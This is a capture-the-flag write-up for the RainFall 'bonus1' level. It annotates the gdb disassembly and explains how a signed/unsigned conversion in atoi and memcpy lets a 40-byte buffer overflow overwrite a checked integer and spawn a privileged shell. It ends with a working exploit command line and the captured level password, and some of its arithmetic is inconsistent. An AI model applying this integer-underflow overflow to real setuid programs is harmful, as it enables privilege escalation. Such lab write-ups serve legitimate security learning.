# bonus1

## Hint

When we log into the machine as `bonus1`, we notice a binary:

```shell-session
bonus1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
```

We notice that the `guid` bit is set, so the executable gets the rights of its group owners granted when it is executed, and conveniently enough the group in question is our target for the current level.

The first run of the binary is resulting a Segmentation Fault.

```shell-session
bonus1@RainFall:~$ ./bonus1
Segmentation fault (core dumped)
```

And any arguments pass to the binary doesn't seems to do anything.

```shell-session
bonus1@RainFall:~$ ./bonus1 0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
bonus1@RainFall:~$
```

Lets dig into it

## gdb

After running `info variables` and `info functions` in gdb, we see no unknown symbols.

Conclusion:
There are no user-defined function or global variables neither.

Ok let's look at `main`

```gdb
gdb-peda$ pdisas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   ebp
   0x08048425 <+1>:	mov    ebp,esp
   0x08048427 <+3>:	and    esp,0xfffffff0                     <-- allign the stack to 16 bytes boundaries
   0x0804842a <+6>:	sub    esp,0x40                           <-- 64 Bytes allocated.
   0x0804842d <+9>:	mov    eax,DWORD PTR [ebp+0xc]            <-- load *argv[]
   0x08048430 <+12>:	add    eax,0x4                            <-- eax = &argv[1]
   0x08048433 <+15>:	mov    eax,DWORD PTR [eax]                <-- eax = argv[1]
   0x08048435 <+17>:	mov    DWORD PTR [esp],eax                <-- prepare argv[1] as argument to atoi()
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>               <-- call atoi(argv[1])
   0x0804843d <+25>:	mov    DWORD PTR [esp+0x3c],eax           <-- store return of atoi(argv[1])
   0x08048441 <+29>:	cmp    DWORD PTR [esp+0x3c],0x9           <-- compare return of atoi(argv[1]) with 9
   0x08048446 <+34>:	jle    0x804844f <main+43>                <-- if atoi(argv[1]) <= 9, jump to main+43
   0x08048448 <+36>:	mov    eax,0x1                            <-- set eax to 1
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>               <-- jump to main+127 (return(1))
   0x0804844f <+43>:	mov    eax,DWORD PTR [esp+0x3c]           <-- load atoi(argv[1])
   0x08048453 <+47>:	lea    ecx,[eax*4+0x0]                    <-- set ecx to atoi(argv[1]) * 4
   0x0804845a <+54>:	mov    eax,DWORD PTR [ebp+0xc]            <-- load char *argv[]
   0x0804845d <+57>:	add    eax,0x8                            <-- set eax to argv[2]
   0x08048460 <+60>:	mov    eax,DWORD PTR [eax]                <-- load char *argv[2]
   0x08048462 <+62>:	mov    edx,eax                            <-- set edx to eax
   0x08048464 <+64>:	lea    eax,[esp+0x14]                     <-- load char buffer[40];
   0x08048468 <+68>:	mov    DWORD PTR [esp+0x8],ecx            <-- set 3rd argument to i *= 4
   0x0804846c <+72>:	mov    DWORD PTR [esp+0x4],edx            <-- set 2nd argument to argv[2]
   0x08048470 <+76>:	mov    DWORD PTR [esp],eax                <-- set 1st argument to buffer
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>             <-- call memcpy(buffer, argv[2], i)
   0x08048478 <+84>:	cmp    DWORD PTR [esp+0x3c],0x574f4c46    <-- compare i with '1464814662'
   0x08048480 <+92>:	jne    0x804849e <main+122>               <-- if i != '1464814662', jump to main+122 (return(0))
   0x08048482 <+94>:	mov    DWORD PTR [esp+0x8],0x0            <-- set 3rd argument to 0
   0x0804848a <+102>:	mov    DWORD PTR [esp+0x4],0x8048580   <-- set 2nd argument to "sh"
   0x08048492 <+110>:	mov    DWORD PTR [esp],0x8048583       <-- set 1st argument to "/bin/sh"
   0x08048499 <+117>:	call   0x8048350 <execl@plt>           <-- call execl("/bin/sh", "sh", 0)
   0x0804849e <+122>:	mov    eax,0x0                         <-- set eax to 0
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret                                    <-- return(0)
End of assembler dump.
```

## Identifying the vulnerability 

We clearly can see that the `main` function is calling `execl` with the `/bin/sh` and `sh` arguments.

But how can we get there ?

### Underflowing the integer 

Our first argument to this binary is passed to `i = atoi(argv[1])`.

Then if our first argument is at most equal to `9`.

We can go further.

Then the value returned by `atoi()` is multiplied by `4`.

So `i` becomes `i * 4`.

Then we have `memcpy(buffer, argv[2], i)`.

We pass our second argument to the binary and it is copied byte after byte to the `buffer`.

The `buffer` can hold at most `40` bytes.

We cleary have a buffer overflow potential here. 

But from a simple mathematical standpoint, it is not possible.

Indeed, to get a buffer overflow, we have to pass more than `40` bytes to the `memcpy()` function.

But to get there we can at most give: `9 * 4` = `36 bytes` to `memcpy()`.

After a bit digging we can see that a integer conversion occurs there.

We receive a signed integer from the `atoi()` function, but we pass a unsigned integer to `memcpy()`.

So we must ensure to have a correct value for the `i` variable as a signed integer and pass the first check and still trigger a buffer overflow.

### Overflowing the buffer 

Since the integer is at the higher memory address than the buffer, we can easily overflow this address and pass the condition `if (i == 1464814662)`.

So technically we need more than 40 bytes to overflow the buffer and be able to overwrite the integer.

But how can we pass a positive value to memcpy with a negative integer as input ?

We know that `uint_max = 2^32 - 1 = 4294967295`.

So if we add `1` to `4294967295` we get 0 when casting it to a unsigned integer.

Let's divide by `4` to get the integer.

`4294967296 / 4 = 1073741824`. If we multiple `(unsigned int)(-1073741824 * 4)` we have 0.

We then have a negative integer that passes the crash we can now find our next segfault deeper in the executable.

We will find which value is causing a buffer overflow with `memcpy` now.

Let's find the segfault from there.

```gdb
(unsigned int)(-1073741824 * 4) = 4.
(unsigned int)(-1073741823 * 4) = 8.
(unsigned int)(-1073741822 * 4) = 12.
(unsigned int)(-1073741821 * 4) = 16.
(unsigned int)(-1073741820 * 4) = 20.
(unsigned int)(-1073741819 * 4) = 24.
(unsigned int)(-1073741818 * 4) = 28.
(unsigned int)(-1073741817 * 4) = 32.
(unsigned int)(-1073741816 * 4) = 36.
(unsigned int)(-1073741815 * 4) = 40.
(unsigned int)(-1073741814 * 4) = 44.
(unsigned int)(-1073741813 * 4) = 48.
(unsigned int)(-1073741812 * 4) = 52.
(unsigned int)(-1073741811 * 4) = 56.
(unsigned int)(-1073741810 * 4) = 60.
(unsigned int)(-1073741809 * 4) = 64.  <-- segfault !
```

```shell-session
bonus1@RainFall:~$ ./bonus1 -1073741809
Segmentation fault (core dumped)
```

We can now overwrite the integer with an exact value and a padding of 40 bytes.

## recap

2 arguments are passed to the program:
1. argv[1] is fed to `atoi()`
   - a variable `i` of type `unsigned int `is used to store the returned value
   - it is then casted to `int` and then tested to be `<=` to 9.
      - false -> return 1
      - true -> continue with program
	 - multiply that value by 4 and call `memcpy`
2. argv[2] is fed to `memcpy` as follows: `memcpy(buffer, argv[2], i);`
   - as we know this function is prone to security exploits, we just need to find the correct value for `i` in order to correctly overflow the destination `buffer`.
   - After a bit of calculations we find a value (`-1073741809`) that not only allows us to pass de `<= 9` test, but also overflow the buffer used in the call to `memcpy` with a value of `64`.
   - Once we have managed to overflow the buffer, we just have to insert with the right padding a specific value at the address of the `i` variable in order to get to the call to `execv("/bin.sh", "sh", 0);`

## Exploit

No need shell code we know exactly where the integer is located. The rest will follow.

```shell-session
bonus1@RainFall:~$ ./bonus1 -1073741809 $(python -c "print '\x90' * 40 + '\x46\x4c\x4f\x57'")
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
